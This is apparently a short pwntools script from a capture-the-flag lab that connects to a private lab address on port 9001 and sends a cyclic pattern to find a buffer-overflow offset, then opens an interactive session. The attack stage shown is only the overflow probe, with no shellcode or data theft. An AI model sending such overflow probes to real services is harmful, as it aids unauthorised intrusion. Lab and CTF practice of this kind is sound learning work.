from pwn import *

p = remote("10.10.54.95", 9001)

p.sendlineafter(":D", b"aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa")

p.interactive()
